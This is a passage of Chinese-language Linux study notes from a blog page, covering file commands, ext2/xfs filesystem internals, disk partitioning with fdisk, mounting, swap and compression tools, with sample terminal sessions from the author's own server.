--preserve=all大概是**全复制**(权限时间什么的都复制)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-i 若文件存在则覆盖时会询问</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-p 连同属性一起复制过去</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-r 递归复制,(用于**目录的复制**)，文件与目录的权限可能会被改变</span><br>    亦可以利用&#123;cp -a /etc /tmp&#125;来执行命令，尤其是备份情况下<br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-l硬链接</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-s软链接，亦快捷方式</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">-u目标与源文件有差异才复制j</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">mv:移动目录和文件（也可以拿来做重命名）</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">basename:获取字符串的文件名</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">dirname:获取字符串的路径名</span><br><br><span class="hljs-comment">#### cp（复制）命令</span><br><br>```linux<br>  cp [-adfilprsu] 源文件(source) 目标文件(destination)<br>  cp [options] source1 source2 source3 ... directory<br></code></pre></td></tr></table></figure></li></ul></li></ul><p>复制时，必须要清除的了解到：</p><ul><li>是否需要完整的保留源文件信息？</li><li>源文件是否为符号链接文件（symbolic link file）？</li><li>源文件是否为特殊的文件，例如FIFO、socket等？</li><li>源文件是否为目录？</li></ul><h3 id="rm（删除文件或目录）"><a href="#rm（删除文件或目录）" class="headerlink" title="rm（删除文件或目录）"></a>rm（删除文件或目录）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> [-fir] 文件或目录<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-f：就是force的意思，忽略不存在的文件，不会出现警告</li><li>-I：交互模式，在删除前会询问使用者是否操作</li><li>-r：递归删除，常用于目录的删除，*<em>非常危险的选项</em></li></ul><h3 id="文件内容查看"><a href="#文件内容查看" class="headerlink" title="文件内容查看"></a>文件内容查看</h3><ul><li>tac:从最后一行显示</li><li>nl:同时输出行号</li><li>more:一页一页显示 (空格下一页,enter下一行,:f立即显示行数,q:立即离开,b往前翻)</li><li>less:与more相同就但是是从后面显示</li><li>head:只看前几行</li><li>tail:只看后几行</li><li>od:以二进制方式读取内容</li><li>cat:从第一行开始显示 -n打印行号包含空白页 -A 显示特殊字符</li></ul><h3 id="修改文件内容与新建"><a href="#修改文件内容与新建" class="headerlink" title="修改文件内容与新建"></a>修改文件内容与新建</h3><ul><li>修改时间:当内容改变而不是权限或属性改变时才会改变的时间</li><li>状态时间:当文件状态改变,例如属性或权限改变时才会改变的时间</li><li>读取时间:当文件的内容被读取时就会改变</li><li>使用touch可以修改文件时间</li></ul><h3 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h3><p>file+文件</p><h3 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h3><ul><li>which 查找执行文件 根据path环境变量所规范的路径去查找 -a显示所有而不是第一个,-i 显示所有查找的路径,主要针对bin&#x2F;sbin下面的文件以及&#x2F;usr&#x2F;share&#x2F;man下面的man page文件 </li><li>使用locate来查找,寻找的数据是由与建立的数据库&#x2F;var&#x2F;lib&#x2F;mlocate里面的数据,这个数据库是日更,直接输入updatedb系统会自动去读取&#x2F;etc&#x2F;updatedn.conf这个文件的设置并更新数据库里面的数据</li><li>find [PATH] [option] [action]<ul><li>-mtime n<ul><li>例如今天为2011-05-05</li><li>n如果前面没有符号则为在第前当n天修改的文件 -mtime 3 则查看2011-05-02</li><li>-n列出在n天之内的被修改的文件 -mtime -3 则查看2011-05-03—2011-05-05</li><li>+n 列出在n天前被修改的内容 -ntime +3 则查看—–到2011-05-01</li></ul></li><li>-uid n 根据用户的ID(&#x2F;etc&#x2F;passwd)查找</li><li>-giu n 根据组名id(&#x2F;etc&#x2F;group)进行查找</li><li>-user name :name为使用者名字</li><li>-group name: name为组名</li><li>-nouser :查找文件拥有者不在(&#x2F;etc&#x2F;passwd)</li><li>-nogroup :查找拥有用户组不在(&#x2F;etc&#x2F;group)内的文件<ul><li>上面两个命令可以用在查找已删除用户或者组但是没删除的文件</li></ul></li><li>-name filename:查找文件名为filename的文件</li><li>-size [+-]SIZE:若用+则查找比SIZE大的,若用-则查找比SIZE小的</li><li>-type :根据类型查找</li><li>-perm :根据权限查找</li><li>-exec :进行额外操作,就是将查找的结果移交到后面的</li></ul></li></ul><h3 id="关于执行文件路径变量-PATH"><a href="#关于执行文件路径变量-PATH" class="headerlink" title="关于执行文件路径变量$PATH"></a>关于执行文件路径变量$PATH</h3><p>ｅｃｈｏ＄PATH可以输出</p><p>将路径加入PATH中的命令 &#x3D; ${PATH}:A</p><p>A为你要添加的路径</p><h2 id="Linux磁盘与文件管理系统"><a href="#Linux磁盘与文件管理系统" class="headerlink" title="Linux磁盘与文件管理系统"></a>Linux磁盘与文件管理系统</h2><p>ext2（Linux second Extended file system）</p><p>由于ext2是属于索引表加数据的一种形式所以几乎不用磁盘碎片整理，但是FAT这种链式磁盘管理方式就需要磁盘碎片整理</p><p>ext2基本是多个区块群组，每个区块群组都有独立的inode、数据区块、超级区块系统,文件系统最前面有一个启动扇区</p><p>ext2原则上:</p><ul><li>不再能修改区块的大小与格式除非格式化</li><li>每个区块最多能够放置一个文件数据</li><li>如果文件大于区块则会多占其他区块</li><li>如果文件小于区块则不能再放别的数据</li></ul><blockquote><p>不同启动扇区安装到别的文件系统最前端这样就能制作多重引导的环境</p></blockquote><p>每一个区块群组有六个主要内容</p><ul><li><p>数据区块</p><ul><li><p>有1K|2K|4K三种</p><table><thead><tr><th>区块大小</th><th>1K</th><th>2K</th><th>4K</th></tr></thead><tbody><tr><td>最大单一文件</td><td>16GB</td><td>256BG</td><td>2TB</td></tr><tr><td>最大文件系统总容量</td><td>2TB</td><td>8TB</td><td>16TB</td></tr></tbody></table><p>是根据inode决定的</p></li></ul></li><li><p>inode</p><ul><li>包含文件的读写属性、用户组、大小、时间、文件特性标识、真正指向的内容、每个inode表固定128B、每个文件都会占一个inode、记录一个数据区要用4B</li><li>inode容量计算假设区块为1K、有12个直接指向、1个间接指向、1个双间接、1个三间接<ul><li>所以直接指向容量&#x3D;12*1K &#x3D; 12K</li><li>间接容量&#x3D;1K*1K&#x2F;4 &#x3D; 256K —-因为间接指向会指向一个新的inode但是这个inode必须直接指向数据区块所以1K&#x2F;4</li><li>双间接容量&#x3D;256*256*1K&#x3D;256^2 * 1K</li><li>三间接容量&#x3D;256^3 * 1K</li><li>总和为16GB</li></ul></li></ul></li><li><p>superblock</p><ul><li>主要信息有数据区块和inode的总量</li><li>未使用以及已经使用的inode、数据区块的数量</li><li>数据区块与inode的大小</li><li>文件系统的挂载时间、最近一次写入数据的时间、最近一次检验磁盘的时间等</li><li>一个有效位数 0来显示文件已经挂载，1来显示为挂载</li></ul></li><li><p>Filesystem Description</p><ul><li>用来描述每个区块群的开始与结束，以及说明每个区块（超级区块、最招标、inode对照表）等的位置</li></ul></li><li><p>区块对照表</p><ul><li>区块的使用情况都在这个表中</li></ul></li><li><p>inode对照表</p><ul><li>记录inode使用和未使用的inode号</li></ul></li></ul><p>ext2可以使用dumpe2fs去查看情况</p><blockquote><p>现在centos默认为xfs所以无法使用dumpe2fs去查看</p></blockquote><h3 id="与目录树的关系"><a href="#与目录树的关系" class="headerlink" title="与目录树的关系"></a>与目录树的关系</h3><p>在新建一个目录的时候就会分配一个inode和至少一个区块</p><p>使用ls -i可以查看inode号码</p><h3 id="Linux文件系统的运行"><a href="#Linux文件系统的运行" class="headerlink" title="Linux文件系统的运行"></a>Linux文件系统的运行</h3><p>当系统加载一个文件如果该文件没有被修改则设置为干净(clear),如果被修改了就设置为脏(dirty)不定时的会向硬盘中会写,还可以使用sync来进行同步来达到数据的一致性——异步处理</p><p>文件系统与内存的关系:</p><ul><li>系统会把常用的文件放到内存中这样会加快系统性能,所以内存经常满了是正常的</li><li>关机命令会主动调用sync来将数据写到磁盘中</li><li>若不能正常关机数据不能写到硬盘中,因此重启时会有很长时间的数据校验,甚至可能导致文件系统的损坏</li></ul><h3 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h3><p>查看支持的</p><blockquote><p>ls -l &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</p></blockquote><p>查看加载到内存的</p><blockquote><p>cat &#x2F;proc&#x2F;filesystems</p></blockquote><p>VFS用来识别管理管理文件系统</p><p>接下来谈谈为啥要一起ext系统选择xfs</p><ul><li>支持度最广,格式化很慢</li><li>xfs适合高容量和巨型文件</li><li>速度虽然与xfs相似但是恢复速度-创建速度都是很慢</li></ul><p>xfs分为三个部分数据区、文件系统活动登陆区、实时运行区</p><ul><li>数据区：包含inode、数据区块、超级区块等数据，xfs与ext的不同是可以有多种不同的容量可以设置512B<del>64KB但由于文件系统的关系最高是4K，而inode最大是256B</del>2MB，一般默认256B够用了</li><li>文件系统活动登陆区：文件变化会记录在这里这个部分可以指定外部的磁盘来作为区块。</li><li>实时运行区：当文件建立时会在这个区段内找到一个到数个extent区块，将文件放置在这里等待分配完毕后，再写入data section的inode与区块中。extent区块可以设置4K~1G，最好和stripe一样大，最好不要乱动可能会影响到物理磁盘的性能</li></ul><blockquote><p>使用xfs_info去观察</p></blockquote><p>xfs_info参数详解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@study ~]<span class="hljs-comment"># df -T /boot</span><br>Filesystem Type 1k-blocks     Used     Available Use% Mounted on<br>/dev/vda2  xfs   1038336      133704  904632    13     /boot<br><span class="hljs-comment"># 可以看出来是xfs文件系统，观察一下</span><br> <br>[root@study ~]<span class="hljs-comment"># xfs_info /dev/vda2</span><br>1  meta-data=/dev/vda2         isize=256    agcount=4, agsize=65536 blks<br>2           =                  sectsz=512   attr=2, projid32bit=1<br>3           =                  crc=0        finobt=0<br>4  data     =                  bsize=4096   blocks=262144, imaxpct=25<br>5           =                  sunit=0      swidth=0 blks<br>6  naming   =version 2         bsize=4096   ascii-ci=0 ftype=0<br>7  <span class="hljs-built_in">log</span>      =internal          bsize=4096   blocks=2560, version=2<br>8           =                  sectsz=512   sunit=0 blks, lazy-count=1<br>9  realtime =none              extsz=4096   blocks=0, rtextents=0<br></code></pre></td></tr></table></figure><ul><li>第 1 行里面的 isize 指的是 inode 的容量，每个有 256Bytes 这么大。至于 agcount 则是 前面谈到的储存区群组 (allocation group) 的个数，共有 4 个， agsize 则是指每个储 存区群组具有 65536 个 block 。配合第 4 行的 block 设置为 4K，因此整个文件系统的容 量应该就是 4655364K 这么大!</li><li>第 2 行里面 sectsz 指的是逻辑扇区 (sector) 的容量设置为 512Bytes 这么大的意思。</li><li>第 4 行里面的 bsize 指的是 block 的容量，每个 block 为 4K 的意思，共有 262144 个 block 在这个文件系统内。</li><li>第 5 行里面的 sunit 与 swidth 与磁盘阵列的 stripe 相关性较高。这部份我们下面格式化 的时候会举一个例子来说明。</li><li>第 7 行里面的 internal 指的是这个登录区的位置在文件系统内，而不是外部设备的意 思。且占用了 4K * 2560 个 block，总共约 10M 的容量。</li><li>第 9 行里面的 realtime 区域，里面的 extent 容量为 4K。不过目前没有使用。</li></ul><h3 id="使用df与du来查看磁盘使用情况"><a href="#使用df与du来查看磁盘使用情况" class="headerlink" title="使用df与du来查看磁盘使用情况"></a>使用df与du来查看磁盘使用情况</h3><ul><li>df:列出文件系统的整体磁盘使用量<ul><li>-h .以GB,MB,KB的形式显示</li><li>-u .不用磁盘容量,以inode来显示</li><li>-T .连通文件系统名称也列出来</li><li>-a .列出所有的文件系统包含&#x2F;proc等文件系统</li><li>-i .列出inode资讯</li></ul></li><li>du:查看文件系统的磁盘使用情况<ul><li>-a或-all 显示目录中个别文件的大小。</li><li>-b或-bytes 显示目录或文件大小时，以byte为单位。</li><li>-c或–total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</li><li>-D或–dereference-args 显示指定符号连接的源文件大小。</li><li>-h或–human-readable 以K，M，G为单位，提高信息的可读性。</li><li>-H或–si 与-h参数相同，但是K，M，G是以1000为换算单位。</li><li>-k或–kilobytes 以1024 bytes为单位。</li><li>-l或–count-links 重复计算硬件连接的文件。</li><li>-L&lt;符号连接&gt;或–dereference&lt;符号连接&gt; 显示选项中所指定符号连接的源文件大小。</li><li>-m或–megabytes 以1MB为单位。</li><li>-s或–summarize 仅显示总计。</li><li>-S或–separate-dirs 显示个别目录的大小时，并不含其子目录的大小。</li><li>-x或–one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。</li><li>-X&lt;文件&gt;或–exclude-from&#x3D;&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。</li><li>–exclude&#x3D;&lt;目录或文件&gt; 略过指定的目录或文件。</li><li>–max-depth&#x3D;&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。</li><li>–help 显示帮助。</li><li>–version 显示版本信息。</li></ul></li></ul><h3 id="软硬链接"><a href="#软硬链接" class="headerlink" title="软硬链接"></a>软硬链接</h3><p>硬链接指代的是一个事实的文件并且新建一个硬链接并不会消耗inode号,因为他俩指向同一文件</p><p>不能跨文件系统,不能连接目录</p><p>ln硬链接</p><p>ln -s软连接</p><p>软链接就是快捷方式,至于大小….   -&gt;右边几个字母大小就是几字节</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> root root     <span class="hljs-number">11</span> <span class="hljs-number">12</span>-<span class="hljs-number">07</span> <span class="hljs-number">16</span>:<span class="hljs-number">01</span> link2013 -&gt; log2013.log<br></code></pre></td></tr></table></figure><p>当我们创建一个新目录的时候一般会有一下几个东西:</p><p>n</p><p>n&#x2F;.</p><p>n&#x2F;..</p><p>所以如果你新建一个目录则新目录会有两个链接(n或n&#x2F;.)和n&#x2F;.. 而上层目录的链接数会+1(因为n&#x2F;..会跳到他)</p><h3 id="如何划分新硬盘"><a href="#如何划分新硬盘" class="headerlink" title="如何划分新硬盘"></a>如何划分新硬盘</h3><h4 id="观察硬盘分区状态"><a href="#观察硬盘分区状态" class="headerlink" title="观察硬盘分区状态"></a>观察硬盘分区状态</h4><p>使用lsblk列出所有存储设备</p><p>-i 代表使用ascii码</p><p>-p 代表输出完整名称不仅仅是最后的名称</p><blockquote><p>[root@YH ~]# lsblk<br>NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sr0     11:0    1 141.4M  0 rom<br>vda    253:0    0    50G  0 disk<br>└─vda1 253:1    0    50G  0 part &#x2F;</p></blockquote><ul><li>NAME       代表设备文件名，会自动省略dev</li><li>MAJ:MIN    代表设备是通过两个代码来实现的,分别是主要设备和次要设备</li><li>RM         代表是否可卸载</li><li>SIZE       代表最大容量</li><li>RO         代表是否为只读设备</li><li>TYPE       代表是硬盘(disk)还是分区(part)或是只读存储器(rom)等输出</li><li>MOUNTPOINT 代表挂载目录</li></ul><p>使用blkid来列出设备的UUID等参数</p><blockquote><p>[root@YH ~]# blkid<br>&#x2F;dev&#x2F;sr0: UUID&#x3D;”2021-08-14-17-43-46-00” LABEL&#x3D;”config-2” TYPE&#x3D;”iso9660”<br>&#x2F;dev&#x2F;vda1: UUID&#x3D;”4b499d76-769a-40a0-93dc-4a31a59add28” TYPE&#x3D;”ext4” </p></blockquote><p>parted列出磁盘分区表类型与分区信息</p><h3 id="建议的分区操作"><a href="#建议的分区操作" class="headerlink" title="建议的分区操作"></a>建议的分区操作</h3><p>先使用lsblk找到磁盘</p><p>使用blkid 磁盘  进行查看磁盘类型 或是使用parted 磁盘</p><p>&#x3D;&#x3D;如果要进行分区注意了fdisk是MBR的分区表,而gdisk是GPT的分区表—!!!千万不要在MBR上面使用gdisk也不要在GPT上面使用fdisk&#x3D;&#x3D;</p><p>使用fdisk或是gdisk进行分区</p><p>分区前先用p进行查看分区情况查看section的位置以免覆盖,使用n可以新建分区</p><p>&lt;建议上面的操作用帮助先验证是否正确&gt;</p><p>在使用w之前都可以用q退出来撤销,分区完后使用w进行写入,由于硬盘可能在使用中所以分区可能不会发生需要用重启或者partpeobe这个命令进行更新Linux内核信息-s会显示出来</p><p>&#x3D;&#x3D;parted也可以进行分区&#x3D;&#x3D;</p><p>使用fdisk进行分区</p><blockquote><p>由于我的linux采用的是ext4所有暂时先介绍fdisk</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">================首先使用这个命令进入分区系统============<br><br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># fdisk /dev/vda</span><br>Welcome to fdisk (util-linux 2.23.2).<br><br>Changes will remain <span class="hljs-keyword">in</span> memory only, until you decide to write them.<br>Be careful before using the write <span class="hljs-built_in">command</span>.<br><br>================d代表删除分区===============<br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): d<br>Selected partition 1<br>Partition 1 is deleted<br>============然后再新建一个分区===========<br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): n<br>Partition <span class="hljs-built_in">type</span>:<br>   p   primary (0 primary, 0 extended, 4 free)<br>   e   extended<br>Select (default p): p<br>Partition number (1-4, default 1): <br>==========默认即可========<br>First sector (2048-104857599, default 2048): <br>Using default value 2048<br>=============最后的区号=============<br>Last sector, +sectors or +size&#123;K,M,G&#125; (2048-104857599, default 104857599): 83886079<br>Partition 1 of <span class="hljs-built_in">type</span> Linux and of size 40 GiB is <span class="hljs-built_in">set</span><br><br>====================进行第二个分区=================<br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): n<br>Partition <span class="hljs-built_in">type</span>:<br>   p   primary (1 primary, 0 extended, 3 free)<br>   e   extended<br>Select (default p): p<br>Partition number (2-4, default 2): <br>First sector (83886080-104857599, default 83886080): <br>Using default value 83886080<br>Last sector, +sectors or +size&#123;K,M,G&#125; (83886080-104857599, default 104857599): <br>Using default value 104857599<br>Partition 2 of <span class="hljs-built_in">type</span> Linux and of size 10 GiB is <span class="hljs-built_in">set</span><br>=================写入分区=================<br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): w<br>The partition table has been altered!<br><br>Calling ioctl() to re-read partition table.<br><br>WARNING: Re-reading the partition table failed with error 16: Device or resource busy.<br>The kernel still uses the old table. The new table will be used at<br>the next reboot or after you run partprobe(8) or kpartx(8)<br>Syncing disks.<br><br>==============使用这个命令更新分区表===============<br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># partprobe</span><br>Warning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.<br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># lsblk</span><br>NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sr0     11:0    1 141.4M  0 rom  <br>vda    253:0    0    50G  0 disk <br>├─vda1 253:1    0    40G  0 part /<br>└─vda2 253:2    0    10G  0 part <br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># blkid </span><br>/dev/sr0: UUID=<span class="hljs-string">&quot;2021-09-10-09-46-39-00&quot;</span> LABEL=<span class="hljs-string">&quot;config-2&quot;</span> TYPE=<span class="hljs-string">&quot;iso9660&quot;</span> <br>/dev/vda1: UUID=<span class="hljs-string">&quot;4b499d76-769a-40a0-93dc-4a31a59add28&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> <br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># parted /dev/vda</span><br>GNU Parted 3.1<br>Using /dev/vda<br>Welcome to GNU Parted! Type <span class="hljs-string">&#x27;help&#x27;</span> to view a list of commands.<br>(parted) <span class="hljs-built_in">print</span>                                                            <br>Model: Virtio Block Device (virtblk)<br>Disk /dev/vda: 53.7GB<br>Sector size (logical/physical): 512B/512B<br>Partition Table: msdos<br>Disk Flags: <br><br>Number  Start   End     Size    Type     File system  Flags<br> 1      1049kB  42.9GB  42.9GB  primary  ext4<br> 2      42.9GB  53.7GB  10.7GB  primary<br><br>(parted) q                                                                <br><br></code></pre></td></tr></table></figure><p>分区后进行格式化</p><p>使用mkfs</p><blockquote><p>[root@YH dev]# mkfs<br>mkfs         mkfs.btrfs   mkfs.cramfs  mkfs.ext2    mkfs.ext3    mkfs.ext4    mkfs.minix   mkfs.xfs  </p></blockquote><p>用tab tab可以查看出可以使用上面这个分区格式化命令(如果要进行格式化的分区已经存在文件系统需要加-f进行强制格式化)</p><h4 id="如果发生了意外导致关机"><a href="#如果发生了意外导致关机" class="headerlink" title="如果发生了意外导致关机"></a>如果发生了意外导致关机</h4><p>需要使用xfs_repair处理xfs文件系统</p><p>至于ext4则使用fsck.ext4进行处理</p><p>要使用上面的命令进行扫描磁盘不能挂载必须卸载</p><h3 id="文件系统的挂载与卸载"><a href="#文件系统的挂载与卸载" class="headerlink" title="文件系统的挂载与卸载"></a>文件系统的挂载与卸载</h3><p>挂载</p><ul><li>单一文件系统不应该重复挂载</li><li>单一目录不应该重复挂载多个文件系统</li><li>要作为挂载点的目录,理论上要空目录才行</li></ul><blockquote><p>挂载了文件系统之后原目录下的东西会暂时消失</p></blockquote><ul><li><p>mount:挂载命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH dev]<span class="hljs-comment"># blkid</span><br>/dev/sr0: UUID=<span class="hljs-string">&quot;2021-09-10-09-46-39-00&quot;</span> LABEL=<span class="hljs-string">&quot;config-2&quot;</span> TYPE=<span class="hljs-string">&quot;iso9660&quot;</span> <br>/dev/vda1: UUID=<span class="hljs-string">&quot;4b499d76-769a-40a0-93dc-4a31a59add28&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> <br>/dev/vda2: UUID=<span class="hljs-string">&quot;77514366-9351-4fa2-b27e-7458d242e76c&quot;</span> TYPE=<span class="hljs-string">&quot;xfs&quot;</span> <br>[root@YH dev]<span class="hljs-comment"># mkdir -p /usr/local/YH</span><br>[root@YH dev]<span class="hljs-comment"># cd /usr/local</span><br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># ls</span><br>bin  etc  games  include  lib  lib64  libexec  qcloud  sbin  share  src  yd.socket.server  YH<br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># mount UUID=&quot;77514366-9351-4fa2-b27e-7458d242e76c&quot; /usr/local/YH</span><br>[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># df /usr/local/YH</span><br>Filesystem     1K-blocks  Used Available Use% Mounted on<br>/dev/vda2       10475520  8276  10467244   1% /usr/local/YH<br><br></code></pre></td></tr></table></figure><p>如果挂载u盘则不能是NTFS格式</p></li><li><p>remount:重新挂载</p></li><li><p>umount:卸载</p><ul><li>-f 强制卸载</li><li>-l 立即卸载(强制性再-f之上)</li></ul></li></ul><blockquote><p>如果发现无法卸载device is busy则使用fuser -mki 目录  来进行删除</p></blockquote><p>如果想要改为开机挂载需要修改&#x2F;etc&#x2F;fstab文件,但是实际的挂载文件在&#x2F;etc&#x2F;mtab内,但是如果fstab这个文件出现语法错误会导致无法开机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># cat /etc/fstab</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># /etc/fstab</span><br><span class="hljs-comment"># Created by anaconda on Thu Mar  7 06:38:37 2019</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span><br><span class="hljs-comment"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span><br><span class="hljs-comment">#</span><br>UUID=4b499d76-769a-40a0-93dc-4a31a59add28 /                       ext4    defaults        1 1<br>==文件名==                               ==挂载目录==            ==文件系统==<br></code></pre></td></tr></table></figure><p>需要进入担任维护模式运行</p><blockquote><p>mount -n -o remount,rw</p></blockquote><h3 id="磁盘-x2F-文件参数"><a href="#磁盘-x2F-文件参数" class="headerlink" title="磁盘&#x2F;文件参数"></a>磁盘&#x2F;文件参数</h3><p>硬盘上主要通过major与minor数值代表设备</p><p>例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH <span class="hljs-built_in">local</span>]<span class="hljs-comment"># lsblk</span><br>NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sr0     11:0    1 141.4M  0 rom  <br>vda    253:0    0    50G  0 disk <br>├─vda1 253:1    0    40G  0 part /<br>└─vda2 253:2    0    10G  0 part /usr/local/YH<br></code></pre></td></tr></table></figure><p>253代表主设备代码(major)而0代表次设备代码(minor)</p><ul><li>mknod:可以设置major与minor</li><li>xfs_admin:可以修改设备的UUID与Label name</li><li>tune2fs:修改ext4的UUID和Lable</li></ul><h3 id="内存交换分区"><a href="#内存交换分区" class="headerlink" title="内存交换分区"></a>内存交换分区</h3><p>按照物理分区进行划分</p><ol><li>分区</li><li>格式化 mkswap:格式化为交换分区</li><li>使用,将该分区启动 swapon:启动</li><li>观察通过free与swapon -s</li></ol><p>使用文件创建内存交换文件</p><ol><li>使用dd命令在&#x2F;tmp下面新增一个文件</li><li>使用mkswap 将新建的文件转换为内存交换文件格式</li><li>使用swapon</li><li>使用swapoff关闭并设置自动启用</li></ol><h2 id="鸭缩"><a href="#鸭缩" class="headerlink" title="鸭缩"></a>鸭缩</h2><p>常见的鸭缩格式有*.z *.zip *.gz *.bz2 *.xz *.tar *.tar.gz *.tar.bz2 *.tar.xz</p><p>其中*.tar代表打包程序,*.z *.zip *.gz *.bz2 *.xz代表鸭缩文件, *.tar.gz这种代表先打包后鸭缩</p><blockquote><p>由于鸭缩一次只能鸭缩一个文件所以才要用tar对多个文件进行打包</p></blockquote><h3 id="鸭缩命令"><a href="#鸭缩命令" class="headerlink" title="鸭缩命令"></a>鸭缩命令</h3><ul><li><p>gzip:</p><ul><li>-c数据输出可以数据流定向 </li><li>-d 解吖缩</li><li>-t 验证一致性 </li><li>-v 鸭缩比 </li><li>-#鸭缩等级 1最快,鸭缩比最差 9最慢 </li><li>默认情况下用gzip鸭缩后源文件不在了</li><li>读取用zcat</li></ul></li><li><p>bzip2:</p><ul><li>参数同上</li><li>读取用bzcat</li></ul></li><li><p>xz:</p><ul><li>用法同上</li><li>读取用xzcat</li></ul></li></ul><p><strong>源文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH YH]<span class="hljs-comment"># ls -als</span><br>total 